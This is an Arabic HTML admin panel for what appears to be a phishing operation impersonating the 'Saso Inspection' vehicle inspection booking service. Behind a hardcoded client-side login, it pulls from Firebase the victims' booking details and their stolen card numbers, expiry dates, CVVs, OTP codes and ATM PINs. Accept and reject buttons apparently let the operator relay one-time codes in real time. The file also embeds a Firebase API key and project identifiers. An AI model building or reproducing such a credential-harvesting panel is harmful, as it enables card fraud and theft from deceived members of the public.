<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Saso Inspection</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 350px; text-align: center; }
        .login-box h2 { color: #1e7344; margin-bottom: 20px; }
        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        #adminContent { display: none; }
        .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
        .nav-btn.active { background: #ffffff; color: #1e7344; }
        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 16px; }
        .container { padding: 15px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        /* تنسيق كروت البيانات */
        .operation-row { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #1e7344; }
        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; }
        .customer-name { font-weight: bold; color: #1e7344; font-size: 16px; }
        
        .data-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
        .info-box { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 8px; min-width: 120px; text-align: center; }
        .info-label { display: block; font-size: 11px; color: #666; margin-bottom: 4px; font-weight: bold; }
        .info-value { display: block; font-size: 14px; color: #333; font-weight: bold; }
        
        .card-highlight { background: #fffcf0; border-color: #fcebb6; }
        .otp-box { background: #e3f2fd; border-color: #bbdefb; }
        .pin-box { background: #f3e5f5; border-color: #e1bee7; }
        
        .actions-area { display: flex; gap: 10px; }
        .btn { flex: 1; padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; }
        .btn-accept { background: #28a745; }
        .btn-accept:hover { background: #218838; }
        .btn-reject { background: #dc3545; }
        .btn-reject:hover { background: #c82333; }
        
        .status-badge { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
        
        .logout-btn { background: #000 !important; margin-top: 10px; font-size: 12px; }
    </style>
</head>
<body onload="checkSavedLogin()">

<div id="loginOverlay">
    <div class="login-box">
        <h2>تسجيل الدخول</h2>
        <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="checkLogin()">دخول</button>
        <p id="loginError" style="color:red; display:none; margin-top:10px; font-size:14px;">بيانات غير صحيحة!</p>
    </div>
</div>

<div id="adminContent">
    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
    <div class="navbar">
        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
        <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
    </div>
    <div class="container">
        <div id="bookingSection" class="tab-content active">
            <div id="bookingGrid"></div>
        </div>
        <div id="cardsSection" class="tab-content">
            <div id="paymentsContainer"></div>
        </div>
    </div>
</div>

<script>
    function checkSavedLogin() {
        if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
    }

    function checkLogin() {
        const userInput = document.getElementById('username').value.trim().toLowerCase();
        const passInput = document.getElementById('password').value.trim();
        if(["adman", "adman_"].includes(userInput) && passInput === "H0987654H") {
            localStorage.setItem("admin_logged_in", "true");
            showAdmin();
        } else {
            document.getElementById('loginError').style.display = 'block';
        }
    }

    function showAdmin() {
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById('adminContent').style.display = 'block';
        initFirebase();
    }

    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }

    function initFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.appspot.com",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };
        
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // عداد الزوار
        database.ref('live_visitors').on('value', s => {
            let active = 0; const now = Date.now();
            s.forEach(c => {
                if(now - c.val().last_active < 30000) active++;
                else database.ref('live_visitors/'+c.key).remove();
            });
            document.getElementById('onlineCount').innerText = active;
        });

        // بيانات الحجوزات
        database.ref('visitors').on('child_added', (snapshot) => {
            const val = snapshot.val();
            const grid = document.getElementById('bookingGrid');
            const row = document.createElement('div');
            row.className = 'operation-row';
            row.innerHTML = `
                <div class="card-header">
                    <span class="customer-name">${val.fullName || 'زائر جديد'}</span>
                </div>
                <div class="data-grid">
                    <div class="info-box"><span class="info-label">نوع السيارة</span><span class="info-value">${val.vehicleType || '-'}</span></div>
                    <div class="info-box"><span class="info-label">رقم اللوحة</span><span class="info-value">${val.plateNumber || '-'}</span></div>
                    <div class="info-box"><span class="info-label">التاريخ</span><span class="info-value">${val.bookingDate || '-'}</span></div>
                    <div class="info-box"><span class="info-label">الوقت</span><span class="info-value">${val.bookingTime || '-'}</span></div>
                </div>
            `;
            grid.prepend(row);
        });

        // بيانات البطاقات (تنسيق منظم جداً)
        database.ref('payments').on('child_added', (snapshot) => {
            const val = snapshot.val();
            const container = document.getElementById('paymentsContainer');
            const row = document.createElement('div');
            row.className = 'operation-row';
            row.id = 'p_' + snapshot.key;
            
            let statusText = "مستقر";
            let statusClass = "";
            if(val.status && val.status.includes('waiting')) {
                statusText = "انتظار ⏳";
                statusClass = "status-waiting";
            }

            row.innerHTML = `
                <div class="card-header">
                    <span class="customer-name">${val.cardHolder || 'عميل'}</span>
                    <span id="stat_${snapshot.key}" class="status-badge ${statusClass}">${statusText}</span>
                </div>
                <div class="data-grid">
                    <div class="info-box card-highlight"><span class="info-label">رقم البطاقة</span><span class="info-value" style="letter-spacing:1px;">${val.cardNumber || '----'}</span></div>
                    <div class="info-box card-highlight"><span class="info-label">انتهاء (YY/MM)</span><span class="info-value">${val.expiry || '--/--'}</span></div>
                    <div class="info-box card-highlight"><span class="info-label">CVV</span><span class="info-value">${val.cvv || '---'}</span></div>
                    <div class="info-box otp-box"><span class="info-label">كود OTP</span><span class="info-value">${val.otp || '-'}</span></div>
                    <div class="info-box pin-box"><span class="info-label">رقم PIN</span><span class="info-value">${val.atm_pin || '-'}</span></div>
                </div>
                <div class="actions-area">
                    <button class="btn btn-accept" onclick="updateStatus('${snapshot.key}', 'accept')">قبول الطلب</button>
                    <button class="btn btn-reject" onclick="updateStatus('${snapshot.key}', 'reject')">رفض الطلب</button>
                </div>
            `;
            container.prepend(row);
        });

        // تحديث الحالة
        database.ref('payments').on('child_changed', (snapshot) => {
            const val = snapshot.val();
            const badge = document.getElementById('stat_' + snapshot.key);
            if (badge) {
                if (val.status === 'accept') { badge.innerText = "مقبول ✅"; badge.className = "status-badge"; badge.style.background = "#d4edda"; }
                else if (val.status === 'reject') { badge.innerText = "مرفوض ❌"; badge.className = "status-badge"; badge.style.background = "#f8d7da"; }
            }
        });
    }

    function updateStatus(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }

    function openTab(evt, tabName) {
        document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
        document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
        document.getElementById(tabName).style.display = "block";
        evt.currentTarget.className += " active";
    }
</script>
</body>
</html>
